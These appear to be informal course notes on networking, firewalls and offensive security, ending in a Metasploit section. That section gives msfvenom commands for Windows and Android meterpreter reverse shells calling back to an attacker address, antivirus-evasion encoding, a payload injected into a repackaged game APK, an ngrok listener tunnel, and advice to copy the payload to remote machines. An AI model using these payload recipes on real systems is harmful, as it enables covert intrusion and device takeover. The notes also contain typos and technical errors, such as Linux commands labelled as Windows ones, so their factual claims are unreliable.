


Every divices are connected to the internet and router is the center componet of the internet and its the main setup which helps us to reach to the internet 


windows route -n 

ipconfig and find the right adapter 

to find the router ip 
route -n 

macos x 

route -n get default 


https://www.techspot.com/guides/287-default-router-ip-addresses/


We access it via a port and we access it with some services and we can explore multiple ports such as 22 80 
443  

you can access the router password by accessing the ip address routerpasswords.com


Router will have the internal and external ip address .
to access the ip address to the go to whats my ip 



Nat :- Network Address translation 
Deny overrule and port forwading is enabled to make the access the accessable 


switches keep a table for to make sure the data transfers to right location 

switch knows the mac addresss and send it to the same domain. opsspooing 

iptable -L 
gives the firewalls rules 


route 


dhcp assigns the ip address to the system 

# Scanning the local system 

Router vulnerability can be threat 

shodan.io 

Both hackers and security researcher use this to find the vulneabilites in the resources 

We can check if our ip is in somewhere of great vulnerable devices and router 


A reverse shell is needed to get the access to the inbound rules 


Firewalls can also be used to block traffic on the internal device also a router and switch can be used IOT untrusted 

Netowrk based firewall  filter network --> inernet filtering 
Install custom firewall with  

Stateful packet Inspection 

Linux Based firewall 

netfilter Iptables is the output should be seen here. we can configure the traffic in our system 

iptables -L

Chain Input (default policy DROP ):- INbound connection so if we want to ping this laptop we can enable this 

chain forward (policy DROP):- Destined to be forwarded on like router or nat or ssl striping 

chain output (policy DROP):- like output connection 


iptables -F will delete all the rules 

iptables -L 

iptables -P INPUT ACCEPT 

iptables -L 

iptables -P OUTPUT ACCEPT

iptables -L 

iptables -P INPUT DROP 

iptables -A INPUT -i lo -j ACCEPT 


unformated firewalls ufw 

ufw status

ufw enable 

ufw status 

ufw status verbose 

ufw default deny incoming 

ufw deafult allow incoming 

ufw allow out 22 

ufw delete allow out 22 

ufw status verbose 

ufw allow out 67:68

vim /etc/default/ufw 

iptables -L 

iptables made easy shorewall 
gufw is for graphical firewall 

linux-firewall

nftables 


Network Attack and Network Isolation It is physically and logically using 

Not well mainted and they are not good security and patched with a good 

Man in the middle attack and

network isolation can mitigate the issues of getting the devices hacked 

opswitching and switch

arp spoofing Injection spoofing and other attacks 

arpspoof ethercap cain and able 

irongeek.com to learn about the arps spoofing 
denieal attack using arpspoofing 

DMZ :- De Milaterized Zone 

netcut 

yersenia to hop over the network and hops overs the vlan 

port protection port security 802.1AE 802.1X port based netowrk connection 


------------------ Day 2 ----------------


the syslog viewer standard mechanism on logging into system 
rsyslog syslogng is open source software implementation TCP version used no most version server linux distribution 

6514 syslog has 8 serverity level  

Using a central Log system 

Wall watcher Syslog server for windows OS to get the logs of the system 

custom firewall have the capabilities to get the functionality 

exploring tcpdump more on how to check if there is any backdoor or not that exit in the server 
we have to check the 

tcpdump -D 


panopticlick to get the information about the data that is sent by the machine 

https://ipleak.net/ to get the information about the ISP getitng your data 

Google is tracking the data most of tha data wheerever you are loggend in is done by google 

https://netmarketshare.com/search-engine-market-share.aspx?options=%7B%22filter%22%3A%7B%22%24and%22%3A%5B%7B%22deviceType%22%3A%7B%22%24in%22%3A%5B%22Desktop%2Flaptop%22%5D%7D%7D%5D%7D%2C%22dateLabel%22%3A%22Trend%22%2C%22attributes%22%3A%22share%22%2C%22group%22%3A%22searchEngine%22%2C%22sort%22%3A%7B%22share%22%3A-1%7D%2C%22id%22%3A%22searchEnginesDesktop%22%2C%22dateInterval%22%3A%22Monthly%22%2C%22dateStart%22%3A%222019-11%22%2C%22dateEnd%22%3A%222020-10%22%2C%22segments%22%3A%22-1000%22%7D

to get the market share of the google data analytics 


https://www.startpage.com/ the most private search engine 



---------------- Day y3 



Iceweasel is different and used as a secure browser 

https://www.bseindia.com/investors/appli_check.aspx



Passwords Security
haveibeenpwened a database to check if your passwords are hacked 

Securing passwords with LastPass

Organize your digital life with LastPass, so you can simply access everything you need and leave the security concerns to us.

Hydra tools can be used to do Dictorary attack 




Information Gathering :- 

Active Information gatehering :- as much data as possible to get into the 
testing we get direct data from the client.

Passve Information gathering :- Middle source that could be anything we geeting the data about the target that must 
be the middle source 


Using tools to get the ip address :- 
Example of Active packet gathering 
PING tool we can get etf.bg.ac.rs
nslook websiteName 
which gives the respose of server and addresss and 

IPinfo.info is a website that can be used to gather the information about the website 
Make a document of the information scanning 

WhatWeb package Description using the plugin to see the and getting the 

whatweb press enter 

whatweb --help 

whatweb arh.bg.ac.rs

TCP and UDP protocol :- 
TCP :- Transmission control protocol asking a packet send to you 
3 Way Handshake 
1:- SYN establish a segment 
2:- SYN/ACK ACK signifies the sequece number 
3:- ACK relaible connection and connection starts 

UDP continue sending other packets 

How many hosts are active in the network is by using nmap 



/usr/share/nmap/scripts there multiple scripts are available to be tested and learn about the nmap scanner 
brute scripts used to bruteforce 
auth 

Using searchspolit tool to find the vulnerabilty related to the version of the software

Nessus setup will checkup the vulnerability of the 




Etenral Blue and Blue keep in windows RDP exploitation 

Routersploit can be used to hack the router as well 

Nessus scanning 

msfvenon can be used to generate the payload to exxploit the target 

msfvenom -p 

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= kali box LPORT kali port -f exe -o shell.exe


Just copy the file to the remote host machines and 
Lets Roll 

msfconsole 

use exploit/multi/handler
this is not an actual exploit think it as a handler of our payload 
is also called a listener 

WE need to set the payload 

set payload windows/x64/meterpreter/reverse_tcp

show options 

set LHOST 

set LPORT

Local host and port should be configured same as the vulnerability and it should be there listening waiting for the connection to run / exexute the progrrame 

once the user run the programm we get the hands of shell we should before hand run the commands to execute the payload 

we must be listening at the time of connection 

run 

shell 

msfvenom --list format

this will give you the payload to the diifrent architecture types 
exe dll and other file types 

Virus total :- A tool to chech the total number of files uploaded and cehceking how many antivirus find the virus

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= 192.168.1.110 LPORT 5555 -f exe -o shell1.exe


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST  LPORT -a x64  -e x64/zutto_dekiru -i 15 --platform windows -n 500 -f exe -o shell2.exe

-x makes it more passing the antivirus 


use exploit/multi/handler 

msfvenom --list payloads


viel is another tool used to generate the payloads 

sudo apt-get install veil 

veil 

use 1 

As you can see multiple options are loaded 

list
to list the payloads of veil 

msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT 5555 -o shell.apk


msfconsole 

evil droid 

msfvenom -x flappy_bird.apk -p android/meterpreter/reverse_tcp LHOST= LPORT 5555 -o shell.apk


./ngrok tcp 5555 



BUG Bounty Something we can do also 

HOW do we communicate to a website 

HTTP Request --> Requested 
HTTP Response --> Returned Resonse 

Usually identify the browser from which we are communicating 
authorization parameter 

Information Gathering Tools for the Website :- 
enumerate and scan 

Harvester to gather emails 

Dirb is a tool to get all the directory of the website 

search bar :- malicious code :- Cross side Scripting 

Brutforce attack send a lot of different passwords 

These vulnerabiltiyt occurs due to the poor written code 



Standard Pyaloads :- Standard Methods <--> Personal Laptops UseCase 

Kese Use Hoti hai --> Kese attacks hote hai 
